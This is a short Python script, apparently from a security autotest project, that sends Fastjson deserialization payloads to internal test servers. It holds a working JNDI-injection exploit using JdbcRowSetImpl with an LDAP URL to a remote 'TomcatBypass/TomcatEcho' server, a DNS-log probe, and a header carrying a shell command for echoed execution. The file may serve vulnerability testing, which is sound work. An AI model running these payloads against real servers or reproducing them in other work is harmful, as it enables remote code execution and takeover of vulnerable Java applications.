# -*- coding:utf8 -*- #
# -----------------------------------------------------------------------------------
# ProjectName:   acnsdp_web_autotest
# FileName:     fastjson.py
# Author:      Jakiro
# Datetime:    2022/1/13 10:31
# Description:
# 命名规则  文件名小写字母+下划线，类名大驼峰，方法、变量名小写字母+下划线连接
# 常量大写，变量和常量用名词、方法用动词
# -----------------------------------------------------------------------------------


import requests
import json_unit

data_json = {
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://10.10.10.41:1389/TomcatBypass/TomcatEcho",
        "autoCommit": True
    }
}
data_2 = {
    "age": 25,
    "name": {
        "a": {
            "@type": "java.lang.Class",
            "val": "com.sun.rowset.JdbcRowSetImpl"
        },
        "b": {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "ldap://10.10.10.41:1389/TomcatBypass/TomcatEcho",
            "autoCommit": True
        }
    }
}
data_1 = {
    "age": 25,
    "name": {"@type": "java.net.InetAddress", "val": "h1blh6.dnslog.cn"}
}
header = {
    'Content-Type': "application/json_unit",
    "cmd": "ls -la /tmp"
}

ses = requests.session()
# res = requests.get('http://10.10.10.41:8080', headers=header)
# res = requests.get('http://10.10.30.171:38181')
# res = ses.post(r'http://10.10.30.171:11052', headers=header, data=json_unit.dumps(data_json))
res = ses.post(r'http://10.10.30.171:25760', headers=header, data=json_unit.dumps(data_2))
a = json_unit.dumps(data_2)
print(a)
# print(res.headers)
print(res.text)
